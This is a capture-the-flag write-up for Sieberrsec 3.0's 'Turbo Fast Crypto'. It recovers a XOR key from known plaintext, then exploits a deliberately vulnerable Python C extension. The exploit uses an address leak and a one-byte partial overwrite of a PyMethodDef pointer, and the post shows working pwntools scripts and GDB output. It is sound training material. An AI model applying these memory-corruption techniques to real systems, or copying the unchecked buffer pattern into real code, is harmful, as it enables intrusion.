---
title: "Sieberrsec 3.0 CTF (2021) - Turbo Fast Crypto (Crypto/Pwn)"
header:
  overlay_image: /assets/images/sieberrsec3.0/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Sieberrsec 3.0 CTF Organisers"

tags:
  - sieberrsec
  - sieberrsec3.0
  - writeup
  - crypto
  - pwn
  - xor
  - python native
  - partial write
---

Summary: An insecurely implemented Python native library allows for an attacker to exfiltrate the
XOR key used to 'encrypt' arbitrary data as well as contains an unbounded buffer overflow on the
encryption buffer allowing partial overwrite of the `ml_meth` pointer of a `PyMethodDef` structure
to trigger a win function.

## Challenge Prompt

Part 1:

```python
Turbo Fast Crypto, part 1
Cryptography

Solves (29) - 117 Points

We found the frontend code for a remote encryption service at nc challs.sieberrsec.tech 3477:

import turbofastcrypto # The source code for this module is only available for part 2 of this challenge :)
while 1:
    plaintext = input('> ')
    ciphertext = turbofastcrypto.encrypt(plaintext)
    print('Encrypted: ' + str(ciphertext))

My partner says it operates under the hood with "XOR", whatever that means. I need you to recover the key.
```

Part 2:

```
Turbo Fast Crypto, part 2
Binary Exploitation

Solves (1) - 900 Points

Using the key you extracted, we found a link to the source code for turbofastcrypto.
There happens to be a secret flag file on the server, and you need to extract it.

A first blood prize of one (1) month of Discord Nitro is available for this challenge.

(the target server is the same as part 1)
```

Attachment: [challenge file]({{ site.url }}{{ site.baseurl }}/assets/files/sieberrsec3.0/tfc.tar.gz)


## Solution

### Part 1

From the Python source given in the part 1 prompt, an unknown library is imported and used to
encrypt some user supplied string. Since the clue that XOR is used, we can get a sample and decrypt
it with our known plaintext to get the key.

```console
nc challs.sieberrsec.tech 3477
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Encrypted: b'\x08\x13\x12:2$"3$52\x1e 3$\x1e3$7$ -$%``<AAAAAAAAAAAAAAAA'
```

Decrypting it:

```console
In [227]: xor(b'\x08\x13\x12:2$"3$52\x1e 3$\x1e3$7$ -$%``<AAAAAAAAAAAAAAAA', b'A')
Out[227]: b'IRS{secrets_are_revealed!!}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

Playing with the application a little foreshadows the next part a little when it demonstrates some
odd stateful behaviour when sending multiple strings:

```console
nc challs.sieberrsec.tech 3477
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Encrypted: b'\x08\x13\x12:2$"3$52\x1e 3$\x1e3$7$ -$%``<AAAAAAAAAAAAAAAA'
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Encrypted: b'IRS{secrets_are_revealed!!}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
>
```

**Flag:** `IRS{secrets_are_revealed!!}`


### Part 2

Unpacking the provided tar file yields the source code to the previous part including a Python
native module.

```console
$ file tfc.tar.gz
tfc.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 51200
$ tar xvf tfc.tar.gz
x distrib_turbofastcrypto/
x distrib_turbofastcrypto/README.md
x distrib_turbofastcrypto/tfc.py
x distrib_turbofastcrypto/compile.sh
x distrib_turbofastcrypto/setup.py
x distrib_turbofastcrypto/checksums.txt
x distrib_turbofastcrypto/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
x distrib_turbofastcrypto/turbofastcrypto.c
```

Examining the `tfc.py` script confirms that this is the 'frontend' we dealt with previously. Thus,
we should focus on the `turbofastcrypto` library instead.

```python
import turbofastcrypto # The source code for this module is only available for part 2 of this challenge :)
while 1:
    plaintext = input('> ')
    ciphertext = turbofastcrypto.encrypt(plaintext)
    print('Encrypted: ' + str(ciphertext))
```

We are given the compiled `turbofastcrypto.cpython-38-x86_64-linux-gnu.so` shared object and the
source code to it. It appears to implement a simple XOR cryptography operation using a fixed sized
buffer called `IV` containing the flag in part 1. It also contains the `print_flag` function which
we are supposed to call somehow.

```c
#define PY_SSIZE_T_CLEAN
#include <Python.h>

char IV[64] = "IRS{secrets_are_revealed!!}";

#pragma GCC optimize ("O0")
__attribute__ ((used)) static void print_flag() { system("cat flag"); }

static PyObject *encrypt(PyObject *self, PyObject *args) {
    const char *cmd;
    Py_ssize_t len;
    if (!PyArg_ParseTuple(args, "s#", &cmd, &len)) return NULL;
    for (int i = 0; i < len; i++) IV[i] ^= cmd[i];
    return PyBytes_FromStringAndSize(IV, len);
}

static PyMethodDef mtds[] = {
    {"encrypt", encrypt, METH_VARARGS, "Encrypt a string" },
    { NULL, NULL, 0, NULL }
};

static struct PyModuleDef moddef = {
    PyModuleDef_HEAD_INIT,
    "turbofastcrypto",
    NULL,
    -1,
    mtds
};

PyMODINIT_FUNC PyInit_turbofastcrypto() { return PyModule_Create(&moddef);}
```

One obvious issue with the code is that the length of the user input obtained through `input()` is
not validated against the size of the buffer, thus we can overflow it and corrupt the structures
following it. We can start an instance of the script to debug it in GDB to observe what the memory
layout looks like and see if we can produce a crash.

First, we can attach to an instance and create a DeBrujin sequence pattern.

```console
gef➤  pattern create 500
[+] Generating a pattern of 500 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
[+] Saved as '$_gef3'
gef➤
```

Next, submitting it to the program and allowing it to run results in a crash at when attempting to
call into `0x6261616161616162`.

```console
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
module_traverse (m=0x7fc7c719fc70, visit=0x54f930 <visit_decref>, arg=0x7fc7c719fc70) at Objects/moduleobject.c:775
775	Objects/moduleobject.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6261616161616162 ("baaaaaab"?)
$rbx   : 0x00007fc7c719fc70  →  0x0000000000000004
$rcx   : 0x00007fc7c72ce058  →  0xff07ff04ff05ffff
...
───────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x474286 <module_traverse+22> mov    rax, QWORD PTR [rax+0x50]
     0x47428a <module_traverse+26> test   rax, rax
     0x47428d <module_traverse+29> je     0x474295 <module_traverse+37>
 →   0x47428f <module_traverse+31> call   rax
     0x474291 <module_traverse+33> test   eax, eax
     0x474293 <module_traverse+35> jne    0x4742b0 <module_traverse+64>
     0x474295 <module_traverse+37> mov    rdi, QWORD PTR [rbx+0x10]
     0x474299 <module_traverse+41> xor    eax, eax
     0x47429b <module_traverse+43> test   rdi, rdi
───────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x6261616161616162 (
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "python", stopped 0x47428f in module_traverse (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x47428f → module_traverse(m=0x7fc7c719fc70, visit=0x54f930 <visit_decref>, arg=0x7fc7c719fc70)
[#1] 0x550256 → subtract_refs(containers=<optimized out>)
[#2] 0x550256 → collect(generation=0x2, n_collected=0x7ffe16255f78, n_uncollectable=0x7ffe16255f80, nofail=0x0, state=<optimized out>)
[#3] 0x551673 → collect_with_callback(state=<optimized out>, generation=0x2)
[#4] 0x551673 → PyGC_Collect()
[#5] 0x551673 → _PyGC_CollectIfEnabled()
[#6] 0x524937 → Py_FinalizeEx()
[#7] 0x5262c5 → Py_FinalizeEx()
[#8] 0x42cb9b → Py_RunMain()
[#9] 0x42d574 → pymain_main(args=0x7ffe162560d0)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

This translates to an offset of 208. Thus, we can possibly obtain RIP control through a standard
buffer overflow.

```console
gef➤  pattern offset 0x6261616161616162
[+] Searching for '0x6261616161616162'
[+] Found at offset 208 (little-endian search) likely
[+] Found at offset 208 (big-endian search)
gef➤
```

However, we have to deal with ASLR now. Our goal is to obtain the base address of the shared object
so we can calculate the absolute address of `print_flag`. We break on the `encrypt` function to
observe if we can utilise the functionality to leak some addresses.

```console
gef➤  br encrypt
Breakpoint 1 at 0x7fc7c820d1c0: file turbofastcrypto.c, line 9.
gef➤  c
Continuing.

Breakpoint 1, encrypt (self=0x7fc7c719fc70, args=0x7fc7c7266910) at turbofastcrypto.c:9
9	static PyObject *encrypt(PyObject *self, PyObject *args) {
...
```

Examining the memory starting from the `IV` buffer shows that there appears to be pointers contained
within the `mtds` structure.

```console
gef➤  x/32xg IV
0x7fdc26804060 <IV>:	0x726365737b535249	0x5f6572615f737465
0x7fdc26804070 <IV+16>:	0x64656c6165766572	0x00000000007d2121
0x7fdc26804080 <IV+32>:	0x0000000000000000	0x0000000000000000
0x7fdc26804090 <IV+48>:	0x0000000000000000	0x0000000000000000
0x7fdc268040a0 <mtds>:	0x00007fdc2680200c	0x00007fdc268011c0
0x7fdc268040b0 <mtds+16>:	0x0000000000000001	0x00007fdc26802014
0x7fdc268040c0 <mtds+32>:	0x0000000000000000	0x0000000000000000
0x7fdc268040d0 <mtds+48>:	0x0000000000000000	0x0000000000000000
0x7fdc268040e0 <moddef>:	0x0000000000000002	0x000000000090ffa0
0x7fdc268040f0 <moddef+16>:	0x00007fdc26801290	0x000000000000000f
0x7fdc26804100 <moddef+32>:	0x00007fdc25794480	0x00007fdc26802025
0x7fdc26804110 <moddef+48>:	0x0000000000000000	0xffffffffffffffff
0x7fdc26804120 <moddef+64>:	0x00007fdc268040a0	0x0000000000000000
0x7fdc26804130 <moddef+80>:	0x0000000000000000	0x0000000000000000
0x7fdc26804140 <moddef+96>:	0x0000000000000000	0x0000000000000000
0x7fdc26804150:	0x332e392075746e75	0x75627537312d302e
gef➤
```

Testing the first pointer `0x00007fdc2680200c` shows that it lies at an offset of `0x200c` or `8204`
from the base address of the shared object.

```console
gef➤  vmmap turbofastcrypto.cpython-38-x86_64-linux-gnu.so
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007fdc26800000 0x00007fdc26801000 0x0000000000000000 r-- /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
0x00007fdc26801000 0x00007fdc26802000 0x0000000000001000 r-x /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
0x00007fdc26802000 0x00007fdc26803000 0x0000000000002000 r-- /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
0x00007fdc26803000 0x00007fdc26804000 0x0000000000002000 r-- /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
0x00007fdc26804000 0x00007fdc26805000 0x0000000000003000 rw- /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
gef➤  vmmap 0x00007fdc268011c0 - 0x00007fdc26800000
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007fdc26801000 0x00007fdc26802000 0x0000000000001000 r-x /vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so
gef➤  p 0x00007fdc2680200c - 0x00007fdc26800000
$9 = 0x200c
gef➤
```
Thus, we can use the XOR operation to leak this address, calculate the base address from it, and
finally derive the `print_flag` address. A quick proof-of-concept script was created to test the
leak and RIP control. To begin with, an address of `0x4242424242424242` was used for validation.

```python
#!/usr/bin/env python

from pwn import *

mtds_offset = 8204
printflag_offset = 0x11a0

context.log_level = 'debug'

def main():
    #p = remote("challs.sieberrsec.tech", 3477)
    p = process(["python", "tfc.py"])

    # Leak the base address of the shared object.
    p.recvuntil(b'>')
    p.sendline(b'A'*72)
    p.recvuntil(b'Encrypted: ')
    leak = xor(util.safeeval.expr(p.recvline())[-8:], b'A')
    mtds_leak = u64(leak)
    log.info('mtds leak: {}'.format(hex(mtds_leak)))

    so_base = mtds_leak - mtds_offset
    log.info('shared object base: {}'.format(hex(so_base)))

    printflag = so_base + printflag_offset
    log.info('print_flag: {}'.format(hex(printflag)))

    # Send the exploit.
    input()
    printflag = 0x4242424242424242
    payload = p64(printflag)
    payload = payload.rjust(208+8, b'A')
    p.recvuntil(b'>')
    p.sendline(payload)

    # Trigger
    payload = b'A'*208
    p.recvuntil(b'>')
    p.sendline(payload)

    p.interactive()


if __name__ == '__main__':
    main()
```

Running the script shows the expected crash:

```console
$ python exploit.py
[+] Starting local process '/home/vagrant/.pyenv/versions/3.8.9/bin/python' argv=[b'python', b'tfc.py'] : pid 14968
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0x49 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[DEBUG] Received 0x74 bytes:
    b'Encrypted: b\'\\x08\\x13\\x12:2$"3$52\\x1e 3$\\x1e3$7$ -$%``<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM\\x91\\x14\\xec\\xd0>AA\'\n'
    b'> '
[*] mtds leak: 0x7f91ad55d00c
[*] shared object base: 0x7f91ad55b000
[*] print_flag: 0x7f91ad55c1a0

[DEBUG] Sent 0xd9 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\n'
[DEBUG] Received 0x1e2 bytes:
    b"Encrypted: b'IRS{secrets_are_revealed!!}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\xd0U\\xad\\x91\\x7f\\x00\\x00\\x81\\x80\\x14\\xec\\xd0>AA@AAAAAAAU\\x91\\x14\\xec\\xd0>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAA\\xe1\\xbe\\xd1AAAAA\\xd1\\x83\\x14\\xec\\xd0>AANAAAAAAA\\xc1\\xb5\\x0f\\xed\\xd0>AAd\\x91\\x14\\xec\\xd0>AAAAAAAAAA\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xbe\\xe1\\xb1\\x14\\xec\\xd0>AAAAAAAAAABBBBBBBB'\n"
    b'> '
[DEBUG] Sent 0xd1 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Switching to interactive mode
AA@AAAAAAAU\x91\x14\xec\xd0>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAA\xe1\xbe\xd1AAAAA\xd1\x83\x14\xec\xd0>AANAAAAAAA\xc1\xb5\x0f\xed\xd0>AAd\x91\x14\xec\xd0>AAAAAAAAAA\xbe\xbe\xbe\xbe\xbe\xbe\xbe\xbe\xe1\xb1\x14\xec\xd0>AAAAAAAAAABBBBBBBB'
> [DEBUG] Received 0xc7 bytes:
    b'Traceback (most recent call last):\n'
    b'  File "tfc.py", line 4, in <module>\n'
    b'    ciphertext = turbofastcrypto.encrypt(plaintext)\n'
    b"TypeError: 'builtin_function_or_method' object does not support vectorcall\n"
Traceback (most recent call last):
  File "tfc.py", line 4, in <module>
    ciphertext = turbofastcrypto.encrypt(plaintext)
TypeError: 'builtin_function_or_method' object does not support vectorcall
$
```

And checking the crash in a debugger shows that the RIP control works.

```console
gef➤  c
Continuing.

Thread 1 "python" received signal SIGSEGV, Segmentation fault.
module_traverse (m=0x7f91ac4eec20, visit=0x54f930 <visit_decref>, arg=0x7f91ac4eec20) at Objects/moduleobject.c:775
775	Objects/moduleobject.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x4242424242424242 ("BBBBBBBB"?)
$rbx   : 0x00007f91ac4eec20  →  0x0000000000000004
$rcx   : 0x00007f91ac61d058  →  0xffffffff05ff0302
...
───────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x474286 <module_traverse+22> mov    rax, QWORD PTR [rax+0x50]
     0x47428a <module_traverse+26> test   rax, rax
     0x47428d <module_traverse+29> je     0x474295 <module_traverse+37>
 →   0x47428f <module_traverse+31> call   rax
     0x474291 <module_traverse+33> test   eax, eax
     0x474293 <module_traverse+35> jne    0x4742b0 <module_traverse+64>
     0x474295 <module_traverse+37> mov    rdi, QWORD PTR [rbx+0x10]
     0x474299 <module_traverse+41> xor    eax, eax
     0x47429b <module_traverse+43> test   rdi, rdi
───────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x4242424242424242 (
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "python", stopped 0x47428f in module_traverse (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x47428f → module_traverse(m=0x7f91ac4eec20, visit=0x54f930 <visit_decref>, arg=0x7f91ac4eec20)
[#1] 0x550256 → subtract_refs(containers=<optimized out>)
[#2] 0x550256 → collect(generation=0x2, n_collected=0x7ffc1694cda8, n_uncollectable=0x7ffc1694cdb0, nofail=0x0, state=<optimized out>)
[#3] 0x551673 → collect_with_callback(state=<optimized out>, generation=0x2)
[#4] 0x551673 → PyGC_Collect()
[#5] 0x551673 → _PyGC_CollectIfEnabled()
[#6] 0x524937 → Py_FinalizeEx()
[#7] 0x5262c5 → Py_FinalizeEx()
[#8] 0x42cb9b → Py_RunMain()
[#9] 0x42d574 → pymain_main(args=0x7ffc1694cf00)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

However, when fixing up the `print_flag` address to use the actual leaked one, we encounter UTF-8
decoding issues. Unfortunately, we cannot encode 6 bytes of arbitrary code points in [UTF-8](https://en.wikipedia.org/wiki/UTF-8).
Only a maximum of 4 bytes is possible. Hence, we cannot properly encode the 6 contiguous bytes
required to specify the address.

```console
$ python exploit.py
[+] Starting local process '/home/vagrant/.pyenv/versions/3.8.9/bin/python' argv=[b'python', b'tfc.py'] : pid 15198
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0x49 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[DEBUG] Received 0x71 bytes:
    b'Encrypted: b\'\\x08\\x13\\x12:2$"3$52\\x1e 3$\\x1e3$7$ -$%``<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM!\\x9c\\xf6\\xff>AA\'\n'
    b'> '
[*] mtds leak: 0x7fbeb7dd600c
[*] shared object base: 0x7fbeb7dd4000
[*] print_flag: 0x7fbeb7dd51a0
[DEBUG] Sent 0xd9 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000d0  a0 51 dd b7  be 7f 00 00  0a                        │·Q··│····│·│
    000000d9
[DEBUG] Received 0x48 bytes:
    b'Traceback (most recent call last):\n'
    b'  File "tfc.py", line 3, in <module>\n'
[DEBUG] Sent 0xd1 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Switching to interactive mode

[*] Process '/home/vagrant/.pyenv/versions/3.8.9/bin/python' stopped with exit code 1 (pid 15198)
[DEBUG] Received 0x11a bytes:
    b"    plaintext = input('> ')\n"
    b'  File "/home/vagrant/.pyenv/versions/3.8.9/lib/python3.8/codecs.py", line 322, in decode\n'
    b'    (result, consumed) = self._buffer_decode(data, self.errors, final)\n'
    b"UnicodeDecodeError: 'utf-8' codec can't decode byte 0xa0 in position 208: invalid start byte\n"
    plaintext = input('> ')
  File "/home/vagrant/.pyenv/versions/3.8.9/lib/python3.8/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xa0 in position 208: invalid start byte
[*] Got EOF while reading in interactive
$
```

Coming back to the analysis of the memory layout, we can inspect the pointers we leaked earlier. The
first pointer in the `mtds` struct points to the name of the function `encrypt`.

```console
gef➤  x/32xg IV
0x7fdc26804060 <IV>:	0x726365737b535249	0x5f6572615f737465
0x7fdc26804070 <IV+16>:	0x64656c6165766572	0x00000000007d2121
0x7fdc26804080 <IV+32>:	0x0000000000000000	0x0000000000000000
0x7fdc26804090 <IV+48>:	0x0000000000000000	0x0000000000000000
0x7fdc268040a0 <mtds>:	0x00007fdc2680200c	0x00007fdc268011c0
0x7fdc268040b0 <mtds+16>:	0x0000000000000001	0x00007fdc26802014
0x7fdc268040c0 <mtds+32>:	0x0000000000000000	0x0000000000000000
0x7fdc268040d0 <mtds+48>:	0x0000000000000000	0x0000000000000000
0x7fdc268040e0 <moddef>:	0x0000000000000002	0x000000000090ffa0
0x7fdc268040f0 <moddef+16>:	0x00007fdc26801290	0x000000000000000f
0x7fdc26804100 <moddef+32>:	0x00007fdc25794480	0x00007fdc26802025
0x7fdc26804110 <moddef+48>:	0x0000000000000000	0xffffffffffffffff
0x7fdc26804120 <moddef+64>:	0x00007fdc268040a0	0x0000000000000000
0x7fdc26804130 <moddef+80>:	0x0000000000000000	0x0000000000000000
0x7fdc26804140 <moddef+96>:	0x0000000000000000	0x0000000000000000
0x7fdc26804150:	0x332e392075746e75	0x75627537312d302e
gef➤  x/s 0x00007fdc268011c0
0x7fdc268011c0 <encrypt>:	"\363\017\036\372UH\211\345H\203\354\060H\211}\330H\211u\320dH\213\004%("
gef➤
```

The second pointer points to the code segment, namely, the body of the `encrypt` function. This
object is the [`PyMethodDef`](https://docs.python.org/3/c-api/structures.html#c.PyMethodDef)
structure used in exposing native modules to Python scripts.

```console
gef➤  disas 0x00007fdc268011c0
Dump of assembler code for function encrypt:
=> 0x00007fdc268011c0 <+0>:	repz nop edx
   0x00007fdc268011c4 <+4>:	push   rbp
   0x00007fdc268011c5 <+5>:	mov    rbp,rsp
   0x00007fdc268011c8 <+8>:	sub    rsp,0x30
   0x00007fdc268011cc <+12>:	mov    QWORD PTR [rbp-0x28],rdi
   0x00007fdc268011d0 <+16>:	mov    QWORD PTR [rbp-0x30],rsi
   0x00007fdc268011d4 <+20>:	mov    rax,QWORD PTR fs:0x28
   0x00007fdc268011dd <+29>:	mov    QWORD PTR [rbp-0x8],rax
   0x00007fdc268011e1 <+33>:	xor    eax,eax
   0x00007fdc268011e3 <+35>:	lea    rcx,[rbp-0x10]
   0x00007fdc268011e7 <+39>:	lea    rdx,[rbp-0x18]
   0x00007fdc268011eb <+43>:	mov    rax,QWORD PTR [rbp-0x30]
   0x00007fdc268011ef <+47>:	lea    rsi,[rip+0xe13]        # 0x7fdc26802009
   0x00007fdc268011f6 <+54>:	mov    rdi,rax
   0x00007fdc268011f9 <+57>:	mov    eax,0x0
   0x00007fdc268011fe <+62>:	call   0x7fdc268010d0
   0x00007fdc26801203 <+67>:	test   eax,eax
   0x00007fdc26801205 <+69>:	jne    0x7fdc2680120e <encrypt+78>
   0x00007fdc26801207 <+71>:	mov    eax,0x0
   0x00007fdc2680120c <+76>:	jmp    0x7fdc26801270 <encrypt+176>
   0x00007fdc2680120e <+78>:	mov    DWORD PTR [rbp-0x1c],0x0
   0x00007fdc26801215 <+85>:	jmp    0x7fdc2680124b <encrypt+139>
   0x00007fdc26801217 <+87>:	mov    rdx,QWORD PTR [rip+0x2dd2]        # 0x7fdc26803ff0
   0x00007fdc2680121e <+94>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00007fdc26801221 <+97>:	cdqe
   0x00007fdc26801223 <+99>:	movzx  ecx,BYTE PTR [rdx+rax*1]
   0x00007fdc26801227 <+103>:	mov    rdx,QWORD PTR [rbp-0x18]
   0x00007fdc2680122b <+107>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00007fdc2680122e <+110>:	cdqe
   0x00007fdc26801230 <+112>:	add    rax,rdx
   0x00007fdc26801233 <+115>:	movzx  eax,BYTE PTR [rax]
   0x00007fdc26801236 <+118>:	xor    ecx,eax
   0x00007fdc26801238 <+120>:	mov    rdx,QWORD PTR [rip+0x2db1]        # 0x7fdc26803ff0
   0x00007fdc2680123f <+127>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00007fdc26801242 <+130>:	cdqe
   0x00007fdc26801244 <+132>:	mov    BYTE PTR [rdx+rax*1],cl
   0x00007fdc26801247 <+135>:	add    DWORD PTR [rbp-0x1c],0x1
   0x00007fdc2680124b <+139>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00007fdc2680124e <+142>:	movsxd rdx,eax
   0x00007fdc26801251 <+145>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00007fdc26801255 <+149>:	cmp    rdx,rax
   0x00007fdc26801258 <+152>:	jl     0x7fdc26801217 <encrypt+87>
   0x00007fdc2680125a <+154>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00007fdc2680125e <+158>:	mov    rsi,rax
   0x00007fdc26801261 <+161>:	mov    rax,QWORD PTR [rip+0x2d88]        # 0x7fdc26803ff0
   0x00007fdc26801268 <+168>:	mov    rdi,rax
   0x00007fdc2680126b <+171>:	call   0x7fdc26801090
   0x00007fdc26801270 <+176>:	mov    rsi,QWORD PTR [rbp-0x8]
   0x00007fdc26801274 <+180>:	xor    rsi,QWORD PTR fs:0x28
   0x00007fdc2680127d <+189>:	je     0x7fdc26801284 <encrypt+196>
   0x00007fdc2680127f <+191>:	call   0x7fdc268010a0
   0x00007fdc26801284 <+196>:	leave
   0x00007fdc26801285 <+197>:	ret
End of assembler dump.
gef➤
```

Additionally, the `print_flag` function is only a few bytes away from the `encrypt` function. Hence,
we can perform a partial one-byte overwrite to coerce calls to the `encrypt` function to run the
`print_flag` function instead. Since it only requires one byte, we can either encode the input
properly as UTF-8 or hope that the single byte we need to write is valid UTF-8 itself.

```console
gef➤  p print_flag
$4 = {void ()} 0x7fdc268011a0 <print_flag>
gef➤  p encrypt - print_flag
$5 = 0x20
gef➤
```

It turns out that it is valid without requiring further encoding. The script to perform this
one-byte overwrite is as follows:

```python
#!/usr/bin/env python

from pwn import *


def main():
    p = remote("challs.sieberrsec.tech", 3477)
    # p = process(["python", "tfc.py"])

    # Calculate the partial byte to overwrite.
    elf = ELF("turbofastcrypto.cpython-38-x86_64-linux-gnu.so")
    to_overwrite = xor(p64(elf.symbols["print_flag"])[0], p64(elf.symbols["encrypt"])[0])
    log.info('Overwriting with byte {}.'.format(hex(ord(to_overwrite))))
    assert to_overwrite.decode('utf-8')
    log.info('Confirmed that the byte is valid UTF-8.')

    # Overwrite a single byte of the `ml_meth` pointer of a `PyMethodDef` structure in `mtds`.
    p.recvuntil(b'>')
    p.sendline(b'A'* (64 + 8) + to_overwrite)

    # Trigger the overwritten encrypt call to get the flag.
    p.recvline()
    p.sendline()
    p.recvuntil(b'> ')
    flag = p.recvline().decode()
    log.success('Flag: {}'.format(flag))


if __name__ == '__main__':
    main()
```

Running the script finally gives us the flag:

```console
$ python exploit_partial.py
[+] Opening connection to challs.sieberrsec.tech on port 3477: Done
[*] '/vagrant/sieberrsec/tfc/distrib_turbofastcrypto_old/turbofastcrypto.cpython-38-x86_64-linux-gnu.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Overwriting with byte 0x60.
[*] Confirmed that the byte is valid UTF-8.
[+] Flag: IRS{w@s_th@t_fun?}
[*] Closed connection to challs.sieberrsec.tech port 3477
```

**Flag:** `IRS{w@s_th@t_fun?}`
